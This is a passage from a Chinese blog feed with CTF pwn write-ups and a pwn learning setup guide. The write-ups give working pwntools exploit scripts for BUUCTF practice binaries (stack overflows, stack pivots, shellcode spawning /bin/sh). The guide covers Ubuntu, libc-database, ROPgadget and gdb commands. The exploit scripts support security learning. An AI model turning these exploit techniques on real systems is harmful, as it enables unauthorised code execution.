<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x27</span> + <span class="string">b&#x27;b&#x27;</span></span><br><span class="line">io.send(payload)            <span class="comment"># 不能用sendline</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;ab&#x27;</span>)</span><br><span class="line">stack_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;stack_addr: &quot;</span> + <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;aaaa&#x27;</span> + p32(system_addr) + p32(<span class="number">0</span>) + p32(stack_addr - <span class="number">0x28</span>) + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload += p32(stack_addr - <span class="number">0x38</span>) + p32(leave_ret_aeer)</span><br><span class="line"></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;jarvisoj_tell_me_something&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25608</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./buu-16-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">good_game_addr = elf.symbols[<span class="string">&#x27;good_game&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span> + p64(good_game_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ez-pz-hackover-2016"><a href="#ez-pz-hackover-2016" class="headerlink" title="ez_pz_hackover_2016"></a>ez_pz_hackover_2016</h1><p>我无法调试？？，对着别人的wp抄了一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io=<span class="number">1</span></span><br><span class="line">filename = <span class="string">&#x27;ez_pz_hackover_2016&#x27;</span></span><br><span class="line">context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;i386&quot;</span>,log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> io:</span><br><span class="line">    io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25190</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./&#x27;</span> + filename)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./buu-16-64.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Yippie, lets crash: &#x27;</span>)</span><br><span class="line">stack_addr = <span class="built_in">int</span>(io.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">print(<span class="string">&quot;stack_addr: &quot;</span>+ <span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;crashme\x00&#x27;</span></span><br><span class="line">payload = payload.ljust(<span class="number">26</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(stack_addr<span class="number">-0x1c</span>) + asm(shellcraft.sh())</span><br><span class="line"><span class="comment"># payload = b&#x27;crashme\x00&#x27;.ljust(30, b&#x27;\x00&#x27;) + asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>emmmm…为什么总是感觉很失落呢</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF-pwn-wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ubuntu使用记录</title>
      <link href="/2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/10/25/Ubuntu%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>命令能sudo就sudo，尽量不要用su -<br>很多命令不能执行是因为权限不足</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Ubuntu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux-Ubuntu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwn的学习记录</title>
      <link href="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
      <url>/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
      
        <content type="html"><![CDATA[<blockquote><p>使用的虚拟机版本为Ubuntu20.04</p></blockquote><h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="下载镜像"><a href="#下载镜像" class="headerlink" title="下载镜像"></a>下载镜像</h2><ol><li><a href="https://ubuntu.com/download/desktop/thank-you?version=20.04.3&architecture=amd64">官网镜像</a></li><li>如果官网下载较慢，<a href="https://mirrors.ustc.edu.cn/ubuntu-releases/20.04/">点击此处</a><br>选择箭头指的那个下载<br><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/1.png"><br>如何安装Ubuntu虚拟机可参考<a href="https://blog.csdn.net/weixin_43848614/article/details/117260662">此处</a></li></ol><h2 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /etc/apt/sources.list /etc/apt/sources.list.bck</span><br><span class="line">sudo gedit /etc/apt/sources.list</span><br></pre></td></tr></table></figure><p>将里面的内容替换为一下内容</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-security main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-updates main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-proposed main restricted universe multiverse</span><br><span class="line"></span><br><span class="line"><span class="keyword">deb</span> http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-backports main restricted universe multiverse</span><br><span class="line"><span class="keyword">deb</span>-src http://mirrors.aliyun.<span class="keyword">com</span>/ubuntu/ focal-backports main restricted universe multiverse</span><br></pre></td></tr></table></figure><p>替换后执行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get upgrade</span><br></pre></td></tr></table></figure><h2 id="python2-3的安装及pip的换源"><a href="#python2-3的安装及pip的换源" class="headerlink" title="python2/3的安装及pip的换源"></a>python2/3的安装及pip的换源</h2><blockquote><p>python2和python3使用pip安装库的命令几乎相同，python3使用pip3 install，python2使用pip2 install<br>如果使用pip安装是直接出现大量红色报错，看看是不是打开了vpn，关闭即可</p></blockquote><h3 id="python3"><a href="#python3" class="headerlink" title="python3"></a>python3</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python-is-python3</span><br><span class="line">sudo apt install python3-pip</span><br><span class="line">sudo pip3 config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="python2"><a href="#python2" class="headerlink" title="python2"></a>python2</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python2</span><br><span class="line">curl -o get-pip.py https://bootstrap.pypa.io/pip/2.7/get-pip.py</span><br><span class="line">sudo python2 get-pip.py</span><br><span class="line">sudo pip2 config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"></span><br><span class="line"><span class="comment">### 下方两个应该不需要</span></span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pip -U</span><br><span class="line">pip install -i https://pypi.tuna.tsinghua.edu.cn/simple  xxxxx</span><br></pre></td></tr></table></figure><h2 id="安装pwntools和pwndbg"><a href="#安装pwntools和pwndbg" class="headerlink" title="安装pwntools和pwndbg"></a>安装pwntools和pwndbg</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip3 install pwntools</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>至此，简单的pwn环境已经配置好了</p><h2 id="安装Pycharm-若不需要可忽略"><a href="#安装Pycharm-若不需要可忽略" class="headerlink" title="安装Pycharm(若不需要可忽略)"></a>安装Pycharm(若不需要可忽略)</h2><p>去<a href="https://www.jetbrains.com/pycharm/download/#section=linux">官网</a>下载Pycharm的安装包<br><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/2.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">tar -zxvf pycharm-community-2021.2.3</span><br><span class="line">sudo mkdir /opt/pycharm </span><br><span class="line">sudo mv pycharm-community-2021.2.3/ /opt/pycharm/</span><br><span class="line"><span class="built_in">cd</span> /opt/pycharm/</span><br><span class="line">sudo /opt/pycharm/pycharm-community-2021.2.3/bin/pycharm.sh</span><br><span class="line">然后有一个弹窗，选择<span class="built_in">continue</span>，再一个弹窗，选哪个都行</span><br></pre></td></tr></table></figure><p><a href="https://blog.csdn.net/feimeng116/article/details/105837483">在Ubuntu 20.04中安装Pycharm 2020.1</a></p><h3 id="切换中文"><a href="#切换中文" class="headerlink" title="切换中文"></a>切换中文</h3><p><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/3.png"><br><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/4.png"></p><h3 id="导入本地库"><a href="#导入本地库" class="headerlink" title="导入本地库"></a>导入本地库</h3><p><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/6.png"><br><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/5.png"></p><h1 id="技能树"><a href="#技能树" class="headerlink" title="技能树"></a>技能树</h1><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h2 id="栈溢出"><a href="#栈溢出" class="headerlink" title="栈溢出"></a>栈溢出</h2><h2 id="堆溢出"><a href="#堆溢出" class="headerlink" title="堆溢出"></a>堆溢出</h2><h1 id="一些小技巧"><a href="#一些小技巧" class="headerlink" title="一些小技巧"></a>一些小技巧</h1><h2 id="如何查看本机libc版本"><a href="#如何查看本机libc版本" class="headerlink" title="如何查看本机libc版本"></a>如何查看本机libc版本</h2><ol><li><p>使用ldd</p><blockquote><p>ldd –version</p></blockquote></li><li><p>通过链接(有点鸡肋)</p><blockquote><p>ll /lib/x86_64-linux-gnu/libc.so.6</p></blockquote></li><li><p>通过路径</p><blockquote><p>/lib32/libc.so.6<br>/usr/lib/x86_64-linux-gnu/libc.so.6</p></blockquote></li></ol><h2 id="Python3中pwntools的一些用法"><a href="#Python3中pwntools的一些用法" class="headerlink" title="Python3中pwntools的一些用法"></a>Python3中pwntools的一些用法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">b&#x27;./pwn&#x27;</span>)</span><br><span class="line">system_addr = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = elf.got[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))          <span class="comment">#搜索pwn中&quot;/bin/sh&quot;的地址</span></span><br><span class="line">io.recv()                                           <span class="comment">#接收数据</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;111&#x27;</span>)                                <span class="comment">#接收到&quot;111&quot;停止</span></span><br><span class="line">io.send()</span><br><span class="line">io.recvline()</span><br><span class="line">io.sendafter()</span><br><span class="line">io.sendlineafter()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="更换文件所链接的libc"><a href="#更换文件所链接的libc" class="headerlink" title="更换文件所链接的libc"></a>更换文件所链接的libc</h2><h3 id="安装最新版的patchelf"><a href="#安装最新版的patchelf" class="headerlink" title="安装最新版的patchelf"></a>安装最新版的patchelf</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/NixOS/patchelf.git</span><br><span class="line"><span class="built_in">cd</span> patchelf</span><br><span class="line">./bootstrap.sh</span><br><span class="line"><span class="comment">###若出现报错autoreconf: not found</span></span><br><span class="line">sudo apt-get install autoconf automake libtool</span><br><span class="line">./bootstrap.sh</span><br><span class="line">./configure</span><br><span class="line">sudo make</span><br><span class="line">sudo make install</span><br><span class="line"><span class="comment">###查看是否安装成功</span></span><br><span class="line">patchelf --version</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">###简单的安装</span></span><br><span class="line">sudo apt-get install patchelf</span><br></pre></td></tr></table></figure><p>然后与看雪师傅的shell脚本结合</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">set -x</span><br><span class="line">libc_path=$1</span><br><span class="line">elf_path=$2</span><br><span class="line">patchelf_bin_path=&quot;/path/to/patchelf&quot;</span><br><span class="line">if [ -f $&#123;libc_path&#125;/ld-[2].[0-9][0-9].so ]; then</span><br><span class="line">    $patchelf_bin_path --set-interpreter $libc_path/ld-[2].[0-9][0-9].so $elf_path</span><br><span class="line">fi</span><br><span class="line">if [ -f $libc_path/libc-[2].[0-9][0-9].so ]; then</span><br><span class="line">    $patchelf_bin_path --replace-needed libc.so.6 $libc_path/libc-[2].[0-9][0-9].so $elf_path</span><br><span class="line">fi</span><br><span class="line">set +x</span><br></pre></td></tr></table></figure><p>将此脚本命名为cnlibc</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo chmod 777 cnlibc</span><br><span class="line">cblibc的地址 libc的地址 程序的地址</span><br><span class="line">/home/weedyssr/Desktop/cnlibc <span class="string">&#x27;/home/weedyssr/Desktop/pwn-change-libc/libs/2.23-0ubuntu11.3_i386&#x27;</span> ./tang</span><br><span class="line">ldd 程序的地址</span><br></pre></td></tr></table></figure><p><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/8.png"></p><h2 id="libc库安装的几张方法"><a href="#libc库安装的几张方法" class="headerlink" title="libc库安装的几张方法"></a>libc库安装的几张方法</h2><h3 id="pwn-change-libc"><a href="#pwn-change-libc" class="headerlink" title="pwn-change-libc"></a>pwn-change-libc</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/tower111/pwn-change-libc.git</span><br><span class="line">python3 update_list</span><br><span class="line">python3 get_env.py  </span><br></pre></td></tr></table></figure><h3 id="libcsearcher的安装"><a href="#libcsearcher的安装" class="headerlink" title="libcsearcher的安装"></a>libcsearcher的安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">python setup.py develop</span><br></pre></td></tr></table></figure><p>示例</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span></span><br><span class="line">obj = LibcSearcher(<span class="string">&quot;fgets&quot;</span>, <span class="number">0X7ff39014bd90</span>)</span><br><span class="line"></span><br><span class="line">obj.dump(<span class="string">&quot;system&quot;</span>)        <span class="comment">#system 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;str_bin_sh&quot;</span>)    <span class="comment">#/bin/sh 偏移</span></span><br><span class="line">obj.dump(<span class="string">&quot;__libc_start_main_ret&quot;</span>)    </span><br></pre></td></tr></table></figure><h3 id="libc-database的安装"><a href="#libc-database的安装" class="headerlink" title="libc-database的安装"></a>libc-database的安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/niklasb/libc-database.git</span><br><span class="line"><span class="built_in">cd</span> libc-database</span><br><span class="line"></span><br><span class="line"><span class="comment">#添加libc库</span></span><br><span class="line">./get  <span class="comment"># List categories</span></span><br><span class="line">./get ubuntu debian  <span class="comment"># Download Ubuntu&#x27;s and Debian&#x27;s libc, old default behavior</span></span><br><span class="line">./get all  <span class="comment"># Download all categories. Can take a while!</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#查找libc版本</span></span><br><span class="line">./find <span class="built_in">printf</span> 260 </span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br><span class="line"></span><br><span class="line">./find <span class="built_in">printf</span> 260 puts f30</span><br><span class="line">archive-glibc (libc6_2.19-10ubuntu2_i386)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">./find __libc_start_main_ret a83 </span><br><span class="line">ubuntu-trusty-i386-libc6 (id libc6_2.19-0ubuntu6.6_i386)</span><br><span class="line">archive-eglibc (id libc6_2.19-0ubuntu6_i386)</span><br><span class="line">ubuntu-utopic-i386-libc6 (id libc6_2.19-10ubuntu2.3_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-10ubuntu2_i386)</span><br><span class="line">archive-glibc (id libc6_2.19-15ubuntu2_i386)</span><br><span class="line"></span><br><span class="line"><span class="comment">#输出libc中的一些函数的偏移</span></span><br><span class="line">./dump libc6_2.19-0ubuntu6.6_i386 </span><br><span class="line">offset___libc_start_main_ret = 0x19a83</span><br><span class="line">offset_system = 0x00040190</span><br><span class="line">offset_dup2 = 0x000db590</span><br><span class="line">offset_recv = 0x000ed2d0</span><br><span class="line">offset_str_bin_sh = 0x160a24</span><br><span class="line"></span><br><span class="line"><span class="comment">#下载特定版本libc</span></span><br><span class="line">./download libc6_2.23-0ubuntu10_amd64</span><br><span class="line">Getting libc6_2.23-0ubuntu10_amd64</span><br><span class="line">    -&gt; Location: http://security.ubuntu.com/ubuntu/pool/main/g/glibc/libc6_2.23-0ubuntu10_amd64.deb</span><br><span class="line">    -&gt; Downloading package</span><br><span class="line">    -&gt; Extracting package</span><br><span class="line">    -&gt; Package saved to libs/libc6_2.23-0ubuntu10_amd64</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="一个可能有用的网站"><a href="#一个可能有用的网站" class="headerlink" title="一个可能有用的网站"></a>一个可能有用的网站</h3><p><a href="https://libc.rip/">https://libc.rip/</a></p><h2 id="ROPgadget"><a href="#ROPgadget" class="headerlink" title="ROPgadget"></a>ROPgadget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span>  <span class="comment">#查找包含pop或ret的地址</span></span><br><span class="line">ROPgadget --binary rop  --only <span class="string">&#x27;pop|ret&#x27;</span> | grep <span class="string">&#x27;eax&#x27;</span> <span class="comment">#在上一条基础上只查看包含eax的地址</span></span><br><span class="line">ROPgadget --binary rop --string <span class="string">&quot;/bin/sh&quot;</span>  <span class="comment">#查找字符串&quot;/bin/sh&quot;的地址</span></span><br></pre></td></tr></table></figure><h2 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><p>用法</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">one_gadget libc6_2.23-0ubuntu11.3_amd64.so</span><br></pre></td></tr></table></figure><p><img src="/2021/10/25/pwn%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/7.png"></p><h2 id="pwngdb使用指南"><a href="#pwngdb使用指南" class="headerlink" title="pwngdb使用指南"></a>pwngdb使用指南</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line">q                       退出</span><br><span class="line">b main                  在main函数处设置断点</span><br><span class="line">b *0x804065             在地址为804065出设置断点</span><br><span class="line">b *$rebase(0x778)       在偏移0x778的地址出设置断点</span><br><span class="line">codebase                打印PIE偏移，与rebase不同，这是打印，rebase是使用</span><br><span class="line">b main:10               给main函数第10行设置断点</span><br><span class="line">stack                   查看栈中内容</span><br><span class="line">stack 30                查看30项</span><br><span class="line">vmmap                   查看段分布</span><br><span class="line">s                       单步步入</span><br><span class="line">n                       单步补过</span><br><span class="line">c                       继续执行到断点，没断点就一直执行下去</span><br><span class="line">r                       run，运行，有断点运行至断点处</span><br><span class="line">i r(info registers)     查看寄存器</span><br><span class="line">i r a                   查看所有寄存器</span><br><span class="line">i r rax                 查看某个寄存器</span><br><span class="line">set $rdi&#x3D;0x10           把rdi寄存器的值变为0x10</span><br><span class="line">set *(0x123456)&#x3D;0x10    0x123456地址的值变为0x10</span><br><span class="line">d 1                     删除1号断点</span><br><span class="line">disable                 禁用断点</span><br><span class="line">i b(info break)         查看断点</span><br><span class="line">info function           查看所有函数名，需保留符号</span><br><span class="line">find xxx　　            快速查找xxx</span><br><span class="line">checksec                检查各种安全防护</span><br><span class="line">dumpargs                显示在调用指令处停止时传递给函数的参数</span><br><span class="line">print main              打印main函数地址</span><br><span class="line">search rdi              从当前位置向后查包含rdi的指令，返回若干</span><br><span 